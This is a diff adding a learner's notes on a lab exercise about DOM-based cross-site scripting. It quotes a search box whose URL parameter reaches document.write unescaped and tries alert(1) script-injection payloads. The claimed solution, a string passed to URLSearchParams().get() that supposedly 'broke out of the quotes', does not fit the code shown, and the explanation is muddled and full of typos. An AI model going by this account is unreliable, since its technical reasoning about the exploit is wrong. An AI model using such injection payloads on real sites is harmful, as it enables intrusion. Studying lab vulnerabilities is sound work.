@@ -1,0 +1,38 @@
+intially trying:
+document.write(<script>alert(1)</script>)
+
+this however is interpreted in the DOM as:
+'document.write(&lt;script&gt;alert(1)&lt;/script&gt;)'
+
+they prpobably have a piece of code to strip the <> characters 
+and replace them as "&lt" and "&gt"
+
+we need to brake out of the sanitisation of the input box
+
+this seems to be the input box code:
+<section class=search>
+    <form action=/ method=GET>
+        <input type=text placeholder='Search the blog...' name=search>
+        <button type=submit class=button>Search</button>
+    </form>
+</section>
+
+it is then used here in this script tag:
+<script>
+    function trackSearch(query) {
+        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+        }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        trackSearch(query);
+    }
+</script>
+
+Next i will try send an object to the input box using:
+document.write(["night", "day"]);
+
+Using this solved the lab:
+URLSearchParams(window.location.search).get('document.write(<script>alert(1)</script>)')
+
+this is due to the breaking out of the quotes for the <script> tag to be enabled
+
